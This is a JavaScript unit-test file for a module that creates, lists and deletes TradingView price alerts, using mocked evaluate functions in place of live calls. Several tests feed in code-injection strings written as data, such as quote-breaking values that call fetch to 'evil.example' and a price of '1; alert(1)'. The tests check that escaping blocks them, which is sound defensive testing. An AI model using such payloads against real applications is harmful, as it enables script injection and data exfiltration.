/**
 * Tests for src/core/alerts.js via _deps injection — no live TradingView needed.
 * Covers: create, list, deleteAlerts.
 *
 * Every test injects BOTH evaluate and evaluateAsync. _resolve() falls back to
 * the real connection.js for anything missing, and alerts.js writes to the live
 * account, so an unexpected call must fail the test instead of reaching CDP.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { inspect } from 'node:util';
import { create, list, deleteAlerts } from '../src/core/alerts.js';
import { safeString } from '../src/connection.js';

// ── Mock helpers ─────────────────────────────────────────────────────────

/** Mock evaluate/evaluateAsync returning scripted values in order; calls tracked in .calls. */
function mockEval(...sequence) {
  const calls = [];
  const fn = async (expr) => {
    calls.push(expr);
    return sequence[calls.length - 1];
  };
  fn.calls = calls;
  return fn;
}

/** Stand-in for a CDP call the test does not expect. */
function forbidden(name) {
  return async () => { throw new Error(`${name} must not be called in this test`); };
}

/** Build _deps with both functions set, so nothing falls back to connection.js. */
function deps({ evaluate = forbidden('evaluate'), evaluateAsync = forbidden('evaluateAsync') } = {}) {
  return { evaluate, evaluateAsync };
}

// ── create() ─────────────────────────────────────────────────────────────

describe('create()', () => {
  it('posts the alert and returns the page result unchanged', async () => {
    const created = { success: true, source: 'internal_api', symbol: 'CME_MINI:ES1!', price: 4500.25, condition: 'greater', message: 'ES up', alert_id: 123 };
    const evaluate = mockEval(created);
    const result = await create({ condition: 'greater_than', price: 4500.25, message: 'ES up', _deps: deps({ evaluate }) });
    assert.deepEqual(result, created);
    assert.equal(evaluate.calls.length, 1);
    const expr = evaluate.calls[0];
    assert.ok(expr.includes("x.open('POST', 'https://pricealerts.tradingview.com/create_alert', false)"));
    assert.ok(expr.includes('var price = 4500.25;'));
    assert.ok(expr.includes('var condType = "greater";'));
    assert.ok(expr.includes('var msg = "ES up";'));
  });

  it('coerces a numeric price string to a number literal', async () => {
    const evaluate = mockEval({ success: true });
    await create({ condition: 'crossing', price: '4500.5', _deps: deps({ evaluate }) });
    assert.ok(evaluate.calls[0].includes('var price = 4500.5;'));
  });

  it('maps condition names, trimming and ignoring case', async () => {
    const cases = [
      ['crossing', 'cross'], ['cross', 'cross'],
      ['greater_than', 'greater'], ['above', 'greater'], ['>', 'greater'],
      ['less_than', 'less'], ['below', 'less'], ['<', 'less'],
      ['  Greater_Than ', 'greater'], ['LESS', 'less'],
      [undefined, 'cross'], ['', 'cross'], ['sideways', 'cross'],
    ];
    for (const [condition, expected] of cases) {
      const evaluate = mockEval({ success: true });
      await create({ condition, price: 1, _deps: deps({ evaluate }) });
      assert.ok(evaluate.calls[0].includes(`var condType = "${expected}";`),
        `condition ${JSON.stringify(condition)} should map to ${expected}`);
    }
  });

  it('leaves msg empty when no message is given, so the page builds a default', async () => {
    const evaluate = mockEval({ success: true });
    await create({ condition: 'crossing', price: 1, _deps: deps({ evaluate }) });
    assert.ok(evaluate.calls[0].includes('var msg = "";'));
  });

  // null, '', '  ', false and [] used to pass requireFinite as 0; true and [5] as 1 and 5.
  for (const price of [NaN, Infinity, -Infinity, 'abc', undefined, '1; alert(1)', null, '', '  ', false, true, [], [5]]) {
    it(`rejects price ${inspect(price)} before calling evaluate`, async () => {
      await assert.rejects(
        () => create({ condition: 'crossing', price, _deps: deps() }),
        { message: `price must be a finite number, got: ${price}` },
      );
    });
  }

  it('passes message only through safeString', async () => {
    const message = 'x"; fetch("https://evil.example"); var y = "\n</script>';
    const evaluate = mockEval({ success: true });
    await create({ condition: 'crossing', price: 1, message, _deps: deps({ evaluate }) });
    const expr = evaluate.calls[0];
    assert.ok(expr.includes(`var msg = ${safeString(message)};`));
    assert.ok(!expr.includes(message), 'raw message must not appear in the evaluated code');
  });

  it('never puts the raw condition string into the evaluated code', async () => {
    const condition = '"; fetch("https://evil.example"); "';
    const evaluate = mockEval({ success: true });
    await create({ condition, price: 1, _deps: deps({ evaluate }) });
    const expr = evaluate.calls[0];
    assert.ok(expr.includes('var condType = "cross";'));
    assert.ok(!expr.includes('evil.example'));
  });
});

// ── list() ───────────────────────────────────────────────────────────────

describe('list()', () => {
  it('returns the alerts from the pricealerts API', async () => {
    const alerts = [
      { alert_id: 11, symbol: 'CME_MINI:ES1!', type: 'price', message: 'a', active: true },
      { alert_id: 22, symbol: 'NASDAQ:AAPL', type: 'price', message: 'b', active: false },
    ];
    const evaluateAsync = mockEval({ alerts });
    const result = await list({ _deps: deps({ evaluateAsync }) });
    assert.deepEqual(result, { success: true, alert_count: 2, source: 'internal_api', alerts, error: undefined });
    assert.equal(evaluateAsync.calls.length, 1);
    assert.ok(evaluateAsync.calls[0].includes("fetch('https://pricealerts.tradingview.com/list_alerts', { credentials: 'include' })"));
  });

  it('returns an empty list when there are no alerts', async () => {
    const evaluateAsync = mockEval({ alerts: [] });
    const result = await list({ _deps: deps({ evaluateAsync }) });
    assert.deepEqual(result, { success: true, alert_count: 0, source: 'internal_api', alerts: [], error: undefined });
  });

  // The page code turns a rejected fetch or a non-"ok" response into { alerts: [], error }.
  it('reports a failed fetch as a failure, not an empty list', async () => {
    const evaluateAsync = mockEval({ alerts: [], error: 'Failed to fetch' });
    const result = await list({ _deps: deps({ evaluateAsync }) });
    assert.deepEqual(result, { success: false, alert_count: 0, source: 'internal_api', alerts: [], error: 'Failed to fetch' });
  });

  it('reports a non-ok API response as a failure', async () => {
    const evaluateAsync = mockEval({ alerts: [], error: 'Unexpected response' });
    const result = await list({ _deps: deps({ evaluateAsync }) });
    assert.deepEqual(result, { success: false, alert_count: 0, source: 'internal_api', alerts: [], error: 'Unexpected response' });
  });

  it('reports a missing or malformed evaluate result as a failure', async () => {
    for (const value of [undefined, null, {}, { alerts: 'nope' }]) {
      const evaluateAsync = mockEval(value);
      const result = await list({ _deps: deps({ evaluateAsync }) });
      assert.deepEqual(result,
        { success: false, alert_count: 0, source: 'internal_api', alerts: [], error: 'No alert list returned from TradingView' },
        `result ${inspect(value)}`);
    }
  });
});

// ── deleteAlerts() ───────────────────────────────────────────────────────

describe('deleteAlerts()', () => {
  it('delete_all: true deletes exactly the listed alert ids', async () => {
    const evaluateAsync = mockEval({ alerts: [{ alert_id: 11 }, { alert_id: 22 }] });
    const evaluate = mockEval({ ok: true, status: 200, response: '{"s":"ok"}' });
    const result = await deleteAlerts({ delete_all: true, _deps: deps({ evaluate, evaluateAsync }) });
    assert.deepEqual(result, { success: true, source: 'internal_api', deleted_count: 2, alert_ids: [11, 22] });
    assert.equal(evaluateAsync.calls.length, 1);
    assert.equal(evaluate.calls.length, 1);
    const expr = evaluate.calls[0];
    assert.ok(expr.includes("x.open('POST', 'https://pricealerts.tradingview.com/delete_alerts', false)"));
    assert.ok(expr.includes('payload: { alert_ids: [11,22] }'));
  });

  it('deletes a single alert_id without listing', async () => {
    const evaluate = mockEval({ ok: true, status: 200 });
    const result = await deleteAlerts({ alert_id: 42, _deps: deps({ evaluate }) });
    assert.deepEqual(result, { success: true, source: 'internal_api', deleted_count: 1, alert_ids: [42] });
    assert.ok(evaluate.calls[0].includes('payload: { alert_ids: [42] }'));
  });

  it('deletes an alert_ids array, dropping null entries', async () => {
    const evaluate = mockEval({ ok: true, status: 200 });
    const result = await deleteAlerts({ alert_ids: [1, null, 3, undefined], _deps: deps({ evaluate }) });
    assert.deepEqual(result, { success: true, source: 'internal_api', deleted_count: 2, alert_ids: [1, 3] });
    assert.ok(evaluate.calls[0].includes('payload: { alert_ids: [1,3] }'));
  });

  it('with no arguments deletes nothing and asks for delete_all or an alert_id', async () => {
    const expected = { success: false, source: 'internal_api', error: 'Provide delete_all: true or an alert_id to delete.' };
    assert.deepEqual(await deleteAlerts({ _deps: deps() }), expected);
    assert.deepEqual(await deleteAlerts({ alert_ids: [], _deps: deps() }), expected);
  });

  it('delete_all: false does not list or delete anything', async () => {
    const result = await deleteAlerts({ delete_all: false, _deps: deps() });
    assert.deepEqual(result, { success: false, source: 'internal_api', error: 'Provide delete_all: true or an alert_id to delete.' });
  });

  it('delete_all: false with an alert_id deletes only that alert', async () => {
    const evaluate = mockEval({ ok: true, status: 200 });
    const result = await deleteAlerts({ delete_all: false, alert_id: 7, _deps: deps({ evaluate }) });
    assert.deepEqual(result, { success: true, source: 'internal_api', deleted_count: 1, alert_ids: [7] });
    assert.ok(evaluate.calls[0].includes('payload: { alert_ids: [7] }'));
  });

  it('delete_all: true with no alerts returns "No alerts to delete."', async () => {
    const evaluateAsync = mockEval({ alerts: [] });
    const result = await deleteAlerts({ delete_all: true, _deps: deps({ evaluateAsync }) });
    assert.deepEqual(result, { success: false, source: 'internal_api', error: 'No alerts to delete.' });
    assert.equal(evaluateAsync.calls.length, 1);
  });

  it('delete_all: true deletes nothing and reports why when listing fails', async () => {
    const cases = [
      [{ alerts: [], error: 'Failed to fetch' }, 'Could not list alerts to delete: Failed to fetch'],
      [null, 'Could not list alerts to delete: No alert list returned from TradingView'],
    ];
    for (const [pageResult, error] of cases) {
      const evaluateAsync = mockEval(pageResult);
      const result = await deleteAlerts({ delete_all: true, _deps: deps({ evaluateAsync }) });
      assert.deepEqual(result, { success: false, source: 'internal_api', error });
    }
  });

  // The string "false" is truthy, so a non-boolean must never reach `if (delete_all)`.
  it('rejects a non-boolean delete_all without listing or deleting anything', async () => {
    for (const delete_all of ['false', 'true', 0, 1, 'yes', {}]) {
      for (const extra of [{}, { alert_id: 5 }]) {
        const result = await deleteAlerts({ delete_all, ...extra, _deps: deps() });
        assert.deepEqual(result,
          { success: false, source: 'internal_api', error: `delete_all must be true or false, got: ${JSON.stringify(delete_all)}` },
          `delete_all ${inspect(delete_all)} with ${inspect(extra)}`);
      }
    }
  });

  it('accepts an alert_id given as digits, as the CLI passes it', async () => {
    for (const alert_id of ['42', ' 42 ']) {
      const evaluate = mockEval({ ok: true, status: 200 });
      const result = await deleteAlerts({ alert_id, _deps: deps({ evaluate }) });
      assert.deepEqual(result, { success: true, source: 'internal_api', deleted_count: 1, alert_ids: [42] });
      assert.ok(evaluate.calls[0].includes('payload: { alert_ids: [42] }'));
    }
  });

  // Number() read '', ' ' and false as 0 and a bare --id (true) as 1.
  it('rejects an alert_id that is not a non-negative integer without listing or deleting anything', async () => {
    for (const alert_id of [true, false, '', ' ', 'abc', '12.5', '-1', '0x1', '1e3', 1.5, -1, NaN, Infinity, 2 ** 53, {}, [], [5]]) {
      for (const extra of [{}, { delete_all: true }]) {
        const result = await deleteAlerts({ alert_id, ...extra, _deps: deps() });
        assert.deepEqual(result,
          { success: false, source: 'internal_api', error: `alert_id must be a non-negative integer, got: ${JSON.stringify(alert_id)}` },
          `alert_id ${inspect(alert_id)} with ${inspect(extra)}`);
      }
    }
  });

  it('treats delete_all: null as not set', async () => {
    const result = await deleteAlerts({ delete_all: null, _deps: deps() });
    assert.deepEqual(result, { success: false, source: 'internal_api', error: 'Provide delete_all: true or an alert_id to delete.' });
  });

  it('reports a failed delete with the ids it tried', async () => {
    const cases = [
      [{ ok: false, status: 403, response: '{"s":"error"}' }, '{"s":"error"}'],
      [{ ok: false, error: 'network down' }, 'network down'],
      [undefined, 'delete failed'],
    ];
    for (const [pageResult, error] of cases) {
      const evaluate = mockEval(pageResult);
      const result = await deleteAlerts({ alert_id: 9, _deps: deps({ evaluate }) });
      assert.deepEqual(result, { success: false, source: 'internal_api', alert_ids: [9], error });
    }
  });

  it('JSON-encodes caller-supplied ids so they cannot break out of the payload', async () => {
    const ids = ['1"] } }); fetch("https://evil.example"); //'];
    const evaluate = mockEval({ ok: true, status: 200 });
    await deleteAlerts({ alert_ids: ids, _deps: deps({ evaluate }) });
    const expr = evaluate.calls[0];
    assert.ok(expr.includes(`payload: { alert_ids: ${JSON.stringify(ids)} }`));
    assert.ok(!expr.includes(ids[0]), 'raw id must not appear in the evaluated code');
  });
});
